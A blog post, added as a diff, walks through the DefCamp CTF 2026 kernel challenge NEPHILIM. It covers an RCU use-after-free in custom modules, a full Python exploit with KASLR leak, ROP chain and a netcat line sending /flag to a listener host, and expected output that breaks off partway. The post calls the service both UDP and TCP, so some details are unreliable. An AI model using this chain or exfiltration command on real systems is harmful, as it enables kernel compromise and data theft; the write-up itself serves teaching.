@@ -1,0 +1,721 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>NEPHILIM (DefCamp CTF 2026) — Stale RCU Reference in a Kernel Module</title>
+    <meta name="description" content="Writeup for NEPHILIM (DefCamp CTF 2026) — reverse three custom kernel modules, find the RCU pointer published past rcu_read_unlock, reclaim the freed descriptor in kmalloc-128, and pivot through an exported gadget into call_usermodehelper">
+    <meta property="og:title" content="NEPHILIM (DefCamp CTF 2026) — Stale RCU Reference in a Kernel Module" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/jpeg" href="../avatar.jpg">
+
+    <style>
+      :root {
+        --bg: #121212;
+        --fg: #e0e0e0;
+        --accent: #61dafb;
+        --border: #333;
+        --muted: #a0a0a0;
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        padding: 0;
+        background: var(--bg);
+        color: var(--fg);
+        font-family: 'Work Sans', sans-serif;
+        line-height: 1.6;
+      }
+
+      a { color: var(--accent); text-decoration: none; }
+      a:hover { text-decoration: underline; }
+
+      .wrapper {
+        max-width: 768px;
+        margin: 0 auto;
+        padding: 2rem 1rem 3rem;
+      }
+
+      .site-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 3rem;
+      }
+      .site-title { font-weight: 700; font-size: 1.5rem; color: var(--fg); }
+      .site-logo { height: 48px; width: 48px; border-radius: 50%; object-fit: cover; }
+
+      .post { max-width: 768px; margin: 0 auto; }
+
+      .post-header h1 { margin: 0 0 0.5rem; font-size: 2rem; font-weight: 500; }
+      .post-subtitle { margin: 0 0 0.75rem; opacity: 0.8; font-size: 1rem; }
+      .post-meta {
+        margin: 0 0 1.5rem;
+        font-size: 0.9rem;
+        color: var(--muted);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+      }
+      .post-tags { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-top: 0.4rem; }
+      .tag {
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 999px;
+        border: 1px solid var(--border);
+        background: rgba(255,255,255,0.02);
+      }
+
+      .post-toc {
+        margin: 2rem 0;
+        padding: 1rem 1.25rem;
+        border-radius: 0.75rem;
+        border: 1px solid var(--border);
+        background: #181818;
+      }
+      .post-toc-title {
+        margin: 0 0 0.5rem;
+        font-size: 0.95rem;
+        font-weight: 500;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        opacity: 0.8;
+      }
+      .post-toc ul { margin: 0; padding-left: 1.25rem; font-size: 0.95rem; }
+      .post-toc li { margin: 0.1rem 0; }
+
+      section + section { margin-top: 2rem; }
+      h2 { font-size: 1.4rem; margin-bottom: 0.5rem; font-weight: 500; }
+      h3 { font-size: 1.15rem; margin-bottom: 0.4rem; font-weight: 500; }
+      p { margin: 0 0 0.9rem; }
+      ul, ol { padding-left: 1.25rem; margin-top: 0; margin-bottom: 0.9rem; }
+
+      code {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        font-size: 0.9rem;
+        background: rgba(255,255,255,0.04);
+        padding: 0.15rem 0.3rem;
+        border-radius: 0.25rem;
+      }
+
+      pre {
+        margin: 0 0 1.25rem;
+        padding: 0.85rem 1rem;
+        background: #0b0b0b;
+        border-radius: 0.5rem;
+        border: 1px solid #1f1f1f;
+        overflow-x: auto;
+      }
+      pre code { background: transparent; padding: 0; }
+
+      .note {
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid var(--border);
+        background: #181818;
+        font-size: 0.92rem;
+        margin-bottom: 1rem;
+      }
+
+      .back-link { margin: 0 0 2rem; font-size: 0.95rem; }
+
+      .site-footer {
+        border-top: 1px solid var(--border);
+        margin-top: 3rem;
+        padding-top: 1rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .site-footer p { margin: 0; font-size: 0.9rem; opacity: 0.6; }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+
+      <header class="site-header">
+        <a href="/" class="site-title">Alexandru Hossu</a>
+        <img src="../avatar.jpg" alt="Logo" class="site-logo">
+      </header>
+
+      <article class="post">
+        <p class="back-link">← <a href="/blog/">Back to blog</a></p>
+
+        <header class="post-header">
+          <h1>NEPHILIM (DefCamp CTF 2026) — Stale RCU Reference in a Kernel Module</h1>
+          <p class="post-subtitle">
+            Three custom kernel modules behind a UDP protocol.
+            <code>nkrcu_snap_create()</code> publishes a descriptor pointer into a global array
+            after leaving its RCU read-side critical section, and <code>nkrcu_remove()</code> frees
+            that descriptor without clearing the array. A monitor workqueue calls
+            <code>snap-&gt;desc-&gt;ops-&gt;validate(snap-&gt;desc)</code> every five seconds — an
+            indirect call through a freed <code>kmalloc-128</code> object.
+          </p>
+          <p class="post-meta">
+            <span>pwn • Linux Kernel • Reverse Engineering</span>
+            <span>DefCamp CTF 2026</span>
+            <span>Challenge by Alexandru Hossu</span>
+          </p>
+          <div class="post-tags">
+            <span class="tag">Linux Kernel</span>
+            <span class="tag">RCU</span>
+            <span class="tag">Use-After-Free</span>
+            <span class="tag">Kernel ROP</span>
+            <span class="tag">SLUB</span>
+          </div>
+        </header>
+
+        <nav class="post-toc">
+          <p class="post-toc-title">On this page</p>
+          <ul>
+            <li><a href="#setup">Challenge setup</a></li>
+            <li><a href="#reversing">Step 1 — reversing the three modules</a></li>
+            <li><a href="#bug">Step 2 — the stale RCU reference</a></li>
+            <li><a href="#reclaim">Step 3 — KASLR leak and reclaim</a></li>
+            <li><a href="#exploit">Step 4 — the exploit</a></li>
+            <li><a href="#info">Reading the flag without a listener</a></li>
+          </ul>
+        </nav>
+
+        <section id="setup">
+          <h2>Challenge setup</h2>
+          <p>You get <code>bzImage</code>, an unstripped <code>vmlinux</code>, an initramfs and three kernel modules — <code>nkrcu.ko</code>, <code>nkmon.ko</code>, <code>nknet.ko</code>. Linux 6.1.184, x86-64, one vCPU. The flag is at <code>/flag</code>, mode 0400, owned by root.</p>
+          <p>The serial console drops to a <code>nobody</code> shell, but a player never reaches it — only TCP port 31337 is exposed.</p>
+          <p>The service speaks NKTP. Framing fields are network order, payload fields are native little-endian:</p>
+          <ul>
+            <li>Request: <code>u32 magic | u8 ver | u8 cmd | u16 seq | u16 plen | u16 cksum | data[plen]</code></li>
+            <li>Response: same header, <code>cmd</code> and <code>seq</code> echoed</li>
+          </ul>
+          <pre><code>| Code | Name        | Input        | Returns                      |
+|------|-------------|--------------|------------------------------|
+| 0x01 | CMD_CREATE  | u64 nonce    | u64 desc_id, u64 desc_kaddr  |
+| 0x02 | CMD_REMOVE  | u64 desc_id  | int32                        |
+| 0x03 | CMD_SNAP    | u64 desc_id  | u64 snap_id                  |
+| 0x04 | CMD_INFO    | u64 desc_id  | 40 raw bytes of the object   |
+| 0x05 | CMD_SPRAY_A | 128 bytes    | u64 kaddr                    |
+| 0x06 | CMD_SPRAY_F | u64 kaddr    | int32                        |
+| 0x07 | CMD_SYNC    | -            | int32                        |</code></pre>
+          <div class="note">
+            <code>CMD_CREATE</code> returns the descriptor's kernel heap address and <code>CMD_SPRAY_A</code> returns the address of every allocation it makes. That looks generous until you notice there is no attacker process inside the VM — no <code>mmap</code>, no <code>setxattr</code> spray, no <code>msg_msg</code>, no <code>pipe_buffer</code>. Without those two return values the bug is unexploitable.
+          </div>
+        </section>
+
+        <section id="reversing">
+          <h2>Step 1 — reversing the three modules</h2>
+          <p>704 lines of C across the three, each doing one job.</p>
+
+          <h3>nkrcu.ko</h3>
+          <p>The object store — descriptor allocator, an RCU-protected list, a snapshot array, a spray allocator, and a <code>synchronize_rcu()</code> wrapper.</p>
+          <pre><code>struct nk_desc {
+    uint64_t              id;         /* +0   also the qword the pivot loads into rsp */
+    uint32_t              state;      /* +8                                           */
+    uint32_t              flags;      /* +12                                          */
+    struct nk_desc_ops   *ops;        /* +16  the vtable nkmon follows                */
+    uint64_t              kernel_fn;  /* +24  &amp;_printk                                */
+    uint64_t              pivot_fn;   /* +32  &amp;nkrcu_pivot                            */
+    struct list_head      list;       /* +40                                          */
+    struct rcu_head       rcu_head;   /* +56                                          */
+    uint8_t               data[56];   /* +72                                          */
+};                                    /* = 128 bytes, kmalloc-128                     */</code></pre>
+          <p>Two fields exist to be leaked. The second points at a gadget the module exports on purpose:</p>
+          <pre><code>/* stack-pivot gadget; intentionally exported; address leaks at runtime via CMD_INFO */
+__attribute__((naked)) void nkrcu_pivot(void)
+{
+    asm volatile(
+        "mov (%rdi), %rsp\n\t"
+        "ret\n\t"
+    );
+}</code></pre>
+          <p>Four bytes — <code>48 8b 27</code>, <code>c3</code>. The byte sequence appears nowhere in this vmlinux, and neither do the obvious <code>mov (%rXX),%rsp ; ret</code> variants.</p>
+
+          <h3>nkmon.ko</h3>
+          <p>A timer re-arms every <code>5 * HZ</code> and schedules work. The work function makes one indirect call per snapshot:</p>
+          <pre><code>static void nk_mon_cb(struct nk_snap *snap, void *priv)
+{
+    if (!snap-&gt;desc || !snap-&gt;desc-&gt;ops || !snap-&gt;desc-&gt;ops-&gt;validate)
+        return;
+    snap-&gt;desc-&gt;ops-&gt;validate(snap-&gt;desc);
+}</code></pre>
+          <p>Compiled, it is a tail jump with the descriptor already in <code>rdi</code>:</p>
+          <pre><code>0:  48 8b 7f 08   mov 0x8(%rdi),%rdi          ; snap-&gt;desc
+9:  48 8b 47 10   mov 0x10(%rdi),%rax         ; desc-&gt;ops
+12: 48 8b 00      mov (%rax),%rax             ; ops-&gt;validate
+1a: e9 ...        jmp __x86_indirect_thunk_rax</code></pre>
+          <p>The three NULL checks are everything the fake object has to satisfy — a non-NULL <code>ops</code> and a non-NULL <code>ops-&gt;validate</code>.</p>
+          <p>One comment carries more weight than it looks:</p>
+          <pre><code>/* workqueue context; validate callback may sleep */</code></pre>
+          <p>Process context is what makes <code>call_usermodehelper(..., UMH_WAIT_PROC)</code> legal at the end of the chain — from a timer softirq it would not be.</p>
+
+          <h3>nknet.ko</h3>
+          <p>A kthread blocked in <code>kernel_recvmsg()</code> on a kernel UDP socket. One thread, so commands are serialized and there is no command-level race. Input validation is three checks:</p>
+          <pre><code>if (len &lt; (int)sizeof(*h))
+    return;
+if (ntohl(h-&gt;magic) != NK_MAGIC || h-&gt;ver != 0x01)
+    return;
+
+plen = ntohs(h-&gt;plen);
+seq  = ntohs(h-&gt;seq);
+
+if ((int)(sizeof(*h) + plen) &gt; len)
+    return;</code></pre>
+          <p>The checksum is computed on responses but never verified on input — so nobody notices it is decorative.</p>
+        </section>
+
+        <section id="bug">
+          <h2>Step 2 — the stale RCU reference</h2>
+          <p>An RCU read-side critical section makes one promise — an object reachable when you entered will not be freed before you leave. The guarantee covers the pointer's use, not its storage.</p>
+          <p><code>nkrcu_snap_create()</code> uses the section correctly to find the descriptor, then carries the pointer out of it:</p>
+          <pre><code>rcu_read_lock();
+desc = nk_find_desc_rcu(desc_id);
+if (!desc) {
+    rcu_read_unlock();
+    return -ENOENT;
+}
+rcu_read_unlock();          /* critical section ends here */
+
+spin_lock_bh(&amp;nk_snap_lock);
+...
+nk_snaps[slot].snap_id   = atomic64_fetch_add(1, &amp;nk_snap_counter);
+nk_snaps[slot].desc      = desc;     /* pointer published after unlock */</code></pre>
+          <p>The instant <code>rcu_read_unlock()</code> runs, the thread stops being a reader and RCU stops protecting anything. What lands in <code>nk_snaps[]</code> is a bare address — no <code>refcount_inc</code>, no <code>kref</code>, no <code>SLAB_TYPESAFE_BY_RCU</code>.</p>
+          <p>Removal then does textbook two-phase teardown:</p>
+          <pre><code>list_del_rcu(&amp;desc-&gt;list);
+spin_unlock(&amp;nk_list_lock);
+
+call_rcu(&amp;desc-&gt;rcu_head, nk_desc_free_rcu);   /* kfree after the grace period */</code></pre>
+          <p>Unlink so no new reader finds it, defer the free so no existing reader trips over it. That protocol is sound only when the list is the sole path to the object — and it is not. <code>nk_snaps[]</code> is a second reference container, and removal never walks it.</p>
+          <p>After one grace period the object returns to the <code>kmalloc-128</code> freelist while <code>nk_snaps[i].desc</code> still holds its address. There is no command to delete a snapshot, and the array is zeroed only in module init. The dangling pointer is permanent, and <code>nkmon</code> dereferences it every five seconds.</p>
+          <div class="note">
+            Which function holds the defect is genuinely ambiguous. Read as a <code>snap_create</code> bug, the snapshot cache leaks an RCU pointer past the critical section. Read as a <code>remove</code> bug, the object has two owners and teardown handles one. Both readings imply different patches — a refcount, or an <code>nk_snaps[]</code> sweep.
+          </div>
+          <p>Neither patch is sufficient alone. <code>nkrcu_snap_iter()</code> copies the array under the spinlock and runs the callback outside it, by design, so the monitor can sleep:</p>
+          <pre><code>spin_lock_bh(&amp;nk_snap_lock);
+for (i = 0; i &lt; NK_MAX_SNAPS; i++)
+    if (nk_snaps[i].snap_id)
+        local[n++] = nk_snaps[i];
+spin_unlock_bh(&amp;nk_snap_lock);
+
+for (i = 0; i &lt; n; i++)
+    cb(&amp;local[i], priv);</code></pre>
+          <p>A removal landing between the copy and the callback still yields a use-after-free on the stack-local copy. The sound fix takes a reference during the copy.</p>
+        </section>
+
+        <section id="reclaim">
+          <h2>Step 3 — KASLR leak and reclaim</h2>
+          <p><code>CMD_INFO</code> returns the first 40 bytes of the object verbatim, which carries both leaks:</p>
+          <pre><code>resp = send_cmd(CMD_INFO, p64(desc_id))
+kernel_fn = u64(resp, 24)   # &amp;_printk
+pivot_fn  = u64(resp, 32)   # &amp;nkrcu_pivot
+
+kernel_base = kernel_fn - PRINTK_OFF</code></pre>
+          <p>One read yields three bases — kernel <code>_text</code>, the module's <code>.text</code>, and the module's <code>.rodata</code> through <code>ops</code>. Module base is randomized separately from <code>_text</code>, so <code>pivot_fn</code> has to be leaked, not computed.</p>
+          <p><code>CMD_SPRAY_A</code> allocates 128 bytes with <code>GFP_ATOMIC</code> and copies 128 attacker bytes in — the same <code>kmalloc-128</code> cache as <code>struct nk_desc</code>. <code>CONFIG_MEMCG</code> is off, so there is no <code>kmalloc-cg-128</code> split.</p>
+          <p>The ROP payload is self-referential: <code>argv</code> points at <code>rop_kaddr + 80</code>, and the <code>argv[]</code> entries live in the same buffer. But <code>CMD_SPRAY_A</code> copies the content before it reveals the address. The way out is a probe — allocate zeroes to learn an address, free it, re-allocate with content written for that address:</p>
+          <pre><code>for attempt in range(1, 32):
+    resp = send_cmd(CMD_SPRAY_A, b"\x00" * 128)
+    candidate = u64(resp)
+    send_cmd(CMD_SPRAY_F, p64(candidate))
+
+    resp = send_cmd(CMD_SPRAY_A, build_rop_data(str_kaddr, candidate, kernel_base))
+    rop_kaddr = u64(resp)
+
+    if rop_kaddr == candidate:
+        return str_kaddr, rop_kaddr</code></pre>
+          <p>Under SLUB's per-CPU LIFO freelist the object comes straight back. Docker cgroup and netfilter allocations occasionally steal the slot, hence the retry.</p>
+          <p>Triggering the free is three commands in a fixed order:</p>
+          <pre><code>send_cmd(CMD_SNAP,   p64(desc_id))   # nk_snaps[0].desc = desc_kaddr
+send_cmd(CMD_REMOVE, p64(desc_id))   # list_del_rcu + call_rcu
+send_cmd(CMD_SYNC)                   # synchronize_rcu()</code></pre>
+          <p><code>CMD_SNAP</code> has to come first — after removal <code>nk_find_desc_rcu</code> cannot find the id and the snapshot returns <code>-ENOENT</code>.</p>
+          <p><code>CMD_SYNC</code> exists because <code>call_rcu()</code> is asynchronous and the network gives no way to observe the callback. Spraying early allocates the fake object before the slot is freed, and later sprays then miss it in confusing ways.</p>
+          <p><code>synchronize_rcu()</code> makes the grace period observable — the 4-byte reply acknowledges that the free happened. With <code>-smp 1</code> both callbacks sit on CPU 0's single list and run in FIFO order.</p>
+        </section>
+
+        <section id="exploit">
+          <h2>Step 4 — the exploit</h2>
+          <p>The fake descriptor is one 128-byte write serving three roles at once:</p>
+          <pre><code>struct.pack_into("&lt;Q", data, 0x00, rop_kaddr)          # new rsp on pivot
+struct.pack_into("&lt;Q", data, 0x10, desc_kaddr + 0x48)  # ops* -&gt; fake_ops
+struct.pack_into("&lt;Q", data, 0x48, GADGET_PIVOT)       # validate = nkrcu_pivot</code></pre>
+          <p><code>ops</code> points back into the object at <code>+0x48</code>, which is inside <code>data[]</code> — so the buffer is the fake descriptor, the fake vtable and the pivot operand simultaneously.</p>
+          <p>Within five seconds the monitor fires:</p>
+          <pre><code>rdi = snap-&gt;desc = desc_kaddr
+rax = [desc_kaddr + 0x10] = desc_kaddr + 0x48    ; fake ops
+rax = [desc_kaddr + 0x48] = nkrcu_pivot          ; fake validate
+jmp __x86_indirect_thunk_rax                     ; rdi still = desc_kaddr
+
+nkrcu_pivot:  mov (%rdi),%rsp                    ; rsp = rop_kaddr
+              ret                                ; first ROP entry</code></pre>
+          <p>The tail jump means no argument shuffling. The pivot replaces <code>rsp</code> wholesale, abandoning the kworker stack.</p>
+          <pre><code>#!/usr/bin/env python3
+# NEPHILIM | DefCamp CTF 2026 | Kernel pwn | Insane
+#
+# Bug: nkrcu_remove() calls list_del_rcu()+call_rcu() but never clears nk_snaps[].desc.
+# After the RCU grace period, snap-&gt;desc is dangling. nkmon fires every 5s and calls
+# snap-&gt;desc-&gt;ops-&gt;validate(snap-&gt;desc) -- UAF trigger.
+#
+# Chain:
+#   [1] CMD_CREATE  -&gt; desc_id, desc_kaddr
+#   [2] CMD_INFO    -&gt; kernel_fn (+24) -&gt; kernel_base; pivot_fn (+32) -&gt; GADGET_PIVOT
+#   [3] CMD_SPRAY_A -&gt; str_kaddr  (path + argv strings)
+#   [4] probe-free-retry loop: SPRAY_A(zeroes)-&gt;cand; SPRAY_F(cand); SPRAY_A(rop@cand)-&gt;rop_kaddr
+#   [5] CMD_SNAP + CMD_REMOVE + CMD_SYNC  -&gt; desc_kaddr freed, snap-&gt;desc dangling
+#   [6] CMD_SPRAY_A(fake_desc) -&gt; lands at desc_kaddr
+#       fake_desc[+0x00] = rop_kaddr       (pivot: mov rsp,[rdi]; ret)
+#       fake_desc[+0x10] = desc_kaddr+0x48 (ops*)
+#       fake_desc[+0x48] = pivot_fn        (validate = nkrcu_pivot)
+#   [7] nkmon workqueue fires:
+#       validate(rdi=desc_kaddr) -&gt; pivot -&gt; ROP -&gt; call_usermodehelper
+#       /bin/sh -c "/bin/nc LHOST LPORT &lt; /flag"
+#
+# Constants (nm vmlinux + ROPgadget --binary vmlinux):
+#   TEXT=$(nm vmlinux | grep ' T _text$' | awk '{print $1}')
+#   PRTK=$(nm vmlinux | grep ' T _printk$' | awk '{print $1}')
+#   UMH=$(nm vmlinux  | grep ' T call_usermodehelper$' | awk '{print $1}')
+#   python3 -c "print(hex(int('$PRTK',16)-int('$TEXT',16)))"
+#   python3 -c "print(hex(int('$UMH',16)-int('$TEXT',16)))"
+#   ROPgadget --binary vmlinux | grep 'pop rdi ; ret'
+#   ROPgadget --binary vmlinux | grep 'pop rsi ; ret'
+#   ROPgadget --binary vmlinux | grep 'pop rdx ; ret'   # xor rdx,rdx absent
+#   ROPgadget --binary vmlinux | grep 'pop rcx ; ret'
+#   GADGET_PIVOT: leaked at runtime from nk_desc[+32] via CMD_INFO (nkrcu_pivot export)
+
+import sys
+import struct
+import socket
+import time
+
+TARGET_IP   = sys.argv[1] if len(sys.argv) &gt; 1 else "127.0.0.1"
+TARGET_PORT = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 31337
+# LHOST must be reachable from inside the VM; use 10.0.2.2 for local QEMU SLIRP
+LHOST       = sys.argv[3] if len(sys.argv) &gt; 3 else "10.0.2.2"
+LPORT       = int(sys.argv[4]) if len(sys.argv) &gt; 4 else 4444
+
+PRINTK_OFF              = 0x0095c929
+OFF_CALL_USERMODEHELPER = 0x00090980
+GADGET_PIVOT    = 0x0000   # set at runtime from CMD_INFO pivot_fn field
+GADGET_POP_RDI  = 0x005d1a7b
+GADGET_POP_RSI  = 0x00020f02
+GADGET_POP_RDX  = 0x0000ac12  # pop rdx; ret  (xor rdx,rdx does not exist here)
+GADGET_POP_RCX  = 0x0071f3c3
+
+MAGIC       = 0x4E4B5450
+CMD_CREATE  = 0x01
+CMD_REMOVE  = 0x02
+CMD_SNAP    = 0x03
+CMD_INFO    = 0x04
+CMD_SPRAY_A = 0x05
+CMD_SPRAY_F = 0x06
+CMD_SYNC    = 0x07
+
+_seq = 0
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(30)
+sock.connect((TARGET_IP, TARGET_PORT))
+
+
+def cksum(data: bytes) -&gt; int:
+    v = 0xDEAD
+    for b in data:
+        v ^= b
+    return v &amp; 0xFFFF
+
+
+def recv_response() -&gt; bytes:
+    hdr = b''
+    while len(hdr) &lt; 12:
+        hdr += sock.recv(12 - len(hdr))
+    plen = struct.unpack_from('&gt;H', hdr, 8)[0]
+    pay = b''
+    while len(pay) &lt; plen:
+        pay += sock.recv(plen - len(pay))
+    return hdr + pay
+
+
+def send_cmd(cmd: int, payload: bytes = b"") -&gt; bytes:
+    global _seq
+    _seq = (_seq + 1) &amp; 0xFFFF
+    hdr   = struct.pack("&gt;IBBHHH", MAGIC, 0x01, cmd, _seq, len(payload), 0)
+    frame = hdr + payload
+    cs    = cksum(frame)
+    frame = frame[:10] + struct.pack("&gt;H", cs) + frame[12:]
+    sock.sendall(frame)
+    return recv_response()[12:]
+
+
+def u64(b, off=0): return struct.unpack_from("&lt;Q", b, off)[0]
+def i32(b, off=0): return struct.unpack_from("&lt;i", b, off)[0]
+def p64(v):        return struct.pack("&lt;Q", v)
+
+
+def build_str_data(lhost: str, lport: int) -&gt; bytes:
+    # +0 "/bin/sh\0"  +8 "-c\0..."  +16 "/bin/nc LHOST LPORT &lt; /flag\0"
+    cmd_b = (f"/bin/nc {lhost} {lport} &lt; /flag").encode()[:103] + b"\x00"
+    data = bytearray(128)
+    data[0:8]    = b"/bin/sh\x00"
+    data[8:16]   = b"-c\x00\x00\x00\x00\x00\x00"
+    data[16:120] = cmd_b.ljust(104, b"\x00")
+    assert len(data) == 128
+    return bytes(data)
+
+
+def build_rop_data(str_kaddr: int, rop_kaddr: int, kernel_base: int) -&gt; bytes:
+    # ROP chain at +0; argv[] at +80
+    # call_usermodehelper(str+0, rop+80, 0, UMH_WAIT_PROC=2)
+    umh     = kernel_base + OFF_CALL_USERMODEHELPER
+    pop_rdi = kernel_base + GADGET_POP_RDI
+    pop_rsi = kernel_base + GADGET_POP_RSI
+    pop_rdx = kernel_base + GADGET_POP_RDX
+    pop_rcx = kernel_base + GADGET_POP_RCX
+
+    data = bytearray(128)
+    struct.pack_into("&lt;Q", data,  0, pop_rdi)
+    struct.pack_into("&lt;Q", data,  8, str_kaddr)       # path = "/bin/sh"
+    struct.pack_into("&lt;Q", data, 16, pop_rsi)
+    struct.pack_into("&lt;Q", data, 24, rop_kaddr + 80)  # argv
+    struct.pack_into("&lt;Q", data, 32, pop_rdx)
+    struct.pack_into("&lt;Q", data, 40, 0)               # envp = NULL
+    struct.pack_into("&lt;Q", data, 48, pop_rcx)
+    struct.pack_into("&lt;Q", data, 56, 2)               # UMH_WAIT_PROC
+    struct.pack_into("&lt;Q", data, 64, umh)
+    # +72: 0 -- after UMH returns, ret reads 0 -&gt; #PF -&gt; panic (flag already received)
+    struct.pack_into("&lt;Q", data, 80, str_kaddr)       # argv[0]
+    struct.pack_into("&lt;Q", data, 88, str_kaddr + 8)   # argv[1]
+    struct.pack_into("&lt;Q", data, 96, str_kaddr + 16)  # argv[2]
+    struct.pack_into("&lt;Q", data,104, 0)               # argv[3] = NULL
+    assert len(data) == 128
+    return bytes(data)
+
+
+def build_fake_desc(desc_kaddr: int, rop_kaddr: int, kernel_base: int) -&gt; bytes:
+    # nk_desc: ops* at +0x10, data[] at +0x48 (embed fake_ops there)
+    # nkrcu_pivot: mov rsp,[rdi]; ret -- reads [desc_kaddr+0] = rop_kaddr
+    data = bytearray(128)
+    struct.pack_into("&lt;Q", data, 0x00, rop_kaddr)          # new rsp on pivot
+    struct.pack_into("&lt;Q", data, 0x10, desc_kaddr + 0x48)  # ops* -&gt; fake_ops
+    struct.pack_into("&lt;Q", data, 0x48, GADGET_PIVOT)       # validate = nkrcu_pivot
+    assert len(data) == 128
+    return bytes(data)
+
+
+def stage1_leak():
+    global GADGET_PIVOT
+    print("[1] KASLR bypass")
+
+    resp = send_cmd(CMD_CREATE, p64(0xCAFEBABEDEADBEEF))
+    desc_id    = u64(resp, 0)
+    desc_kaddr = u64(resp, 8)
+    print(f"    desc_id    = {desc_id:#018x}")
+    print(f"    desc_kaddr = {desc_kaddr:#018x}")
+
+    resp = send_cmd(CMD_INFO, p64(desc_id))
+    kernel_fn = u64(resp, 24)  # &amp;_printk
+    pivot_fn  = u64(resp, 32)  # &amp;nkrcu_pivot
+    print(f"    kernel_fn  = {kernel_fn:#018x}  (&amp;_printk)")
+    print(f"    pivot_fn   = {pivot_fn:#018x}  (nkrcu_pivot)")
+
+    kernel_base  = kernel_fn - PRINTK_OFF
+    GADGET_PIVOT = pivot_fn
+    print(f"    kernel_base = {kernel_base:#018x}")
+
+    return desc_id, desc_kaddr, kernel_base
+
+
+def stage2_spray(kernel_base: int):
+    print("[2] Pre-spray strings + ROP (desc alive)")
+
+    resp = send_cmd(CMD_SPRAY_A, build_str_data(LHOST, LPORT))
+    str_kaddr = u64(resp)
+    print(f"    str_kaddr  = {str_kaddr:#018x}")
+
+    # Probe-free-retry: allocate zeroes to learn a candidate address, free it,
+    # then immediately reallocate with correct ROP data (argv pointers use candidate).
+    # If Docker background activity consumes the freed slot before we reclaim it,
+    # the new allocation lands elsewhere -- free it and retry with the new address.
+    # Direction-agnostic: works regardless of SLUB freelist order (host vs Docker).
+    for attempt in range(1, 32):
+        resp = send_cmd(CMD_SPRAY_A, b"\x00" * 128)
+        candidate = u64(resp)
+        send_cmd(CMD_SPRAY_F, p64(candidate))
+
+        resp = send_cmd(CMD_SPRAY_A, build_rop_data(str_kaddr, candidate, kernel_base))
+        rop_kaddr = u64(resp)
+
+        if rop_kaddr == candidate:
+            print(f"    rop_kaddr  = {rop_kaddr:#018x}  (attempt {attempt})")
+            return str_kaddr, rop_kaddr
+
+        send_cmd(CMD_SPRAY_F, p64(rop_kaddr))
+
+    print("    [-] stage2 FAILED after 31 attempts")
+    sys.exit(1)
+
+
+def stage3_uaf(desc_id: int):
+    print("[3] UAF: SNAP + REMOVE + SYNC")
+
+    resp = send_cmd(CMD_SNAP, p64(desc_id))
+    print(f"    snap_id = {u64(resp):#018x}  (snap-&gt;desc = desc_kaddr)")
+
+    assert i32(send_cmd(CMD_REMOVE, p64(desc_id))) == 0
+    print("    REMOVE ok -- call_rcu() scheduled")
+
+    print("    SYNC: waiting for RCU grace period...")
+    assert i32(send_cmd(CMD_SYNC)) == 0
+    print("    done -- desc_kaddr FREED, snap-&gt;desc DANGLING")
+
+
+def stage4_spray_fake(desc_kaddr: int, rop_kaddr: int, kernel_base: int):
+    print("[4] Spray fake_desc into freed slot")
+
+    # After SYNC, desc_kaddr is freed and may sit in the SLUB per-CPU freelist
+    # or in a slab partial-list depending on environment (host vs Docker).
+    # Strategy: spray fake_desc repeatedly WITHOUT freeing misses.
+    # Keeping misses allocated drains the per-CPU freelist and forces SLUB to
+    # pull from partial slabs, which is where desc_kaddr lives if background
+    # activity (Docker cgroups / netfilter) already consumed the top freelist slot.
+    # NK_MAX_SPRAY=64; with str+rop (2 slots) we have 62 slots for misses+landing.
+    fake   = build_fake_desc(desc_kaddr, rop_kaddr, kernel_base)
+    misses = []
+
+    for attempt in range(1, 56):
+        resp = send_cmd(CMD_SPRAY_A, fake)
+        got  = u64(resp)
+        if got == desc_kaddr:
+            print(f"    [+] LANDED at {got:#018x} (attempt {attempt})")
+            for addr in misses:
+                send_cmd(CMD_SPRAY_F, p64(addr))
+            return
+        misses.append(got)
+
+    print(f"    [-] FAILED after 55 attempts -- desc_kaddr={desc_kaddr:#018x}")
+    sys.exit(1)
+
+
+def stage5_wait():
+    print("[5] Waiting for nkmon trigger (&lt;=5s)")
+    print()
+    print("    nkmon workqueue:")
+    print("      snap-&gt;desc-&gt;ops-&gt;validate(desc_kaddr)")
+    print("      = nkrcu_pivot(rdi=desc_kaddr)")
+    print("      mov rsp,[rdi]  -&gt;  rsp = rop_kaddr")
+    print("      call_usermodehelper('/bin/sh',['-c','/bin/nc LHOST LPORT &lt; /flag'],NULL,2)")
+    print("      UMH_WAIT_PROC blocks until nc exits")
+    time.sleep(6)
+    print("[+] done -- flag should be in your listener")
+
+
+def main():
+    print(f"NEPHILIM | {TARGET_IP}:{TARGET_PORT} -&gt; {LHOST}:{LPORT}")
+    print()
+    print(f"[!] start listener: nc -lvp {LPORT}")
+    input("    ENTER when ready... ")
+    print()
+
+    desc_id, desc_kaddr, kernel_base = stage1_leak()
+    print()
+    str_kaddr, rop_kaddr = stage2_spray(kernel_base)
+    print()
+    stage3_uaf(desc_id)
+    print()
+    stage4_spray_fake(desc_kaddr, rop_kaddr, kernel_base)
+    print()
+    stage5_wait()
+
+
+if __name__ == "__main__":
+    main()</code></pre>
+          <p>Expected output:</p>
+          <pre><code>NEPHILIM | 127.0.0.1:31337 -&gt; 172.17.0.1:4444
+
+[!] start listener: nc -lvp 4444
+    ENTER when ready...
+
+[1] KASLR bypass
+    desc_id    = 0x0000000000000001
+    desc_kaddr = 0xffffa00a41b6f400
+    kernel_fn  = 0xffffffffaeb5c929  (&amp;_printk)
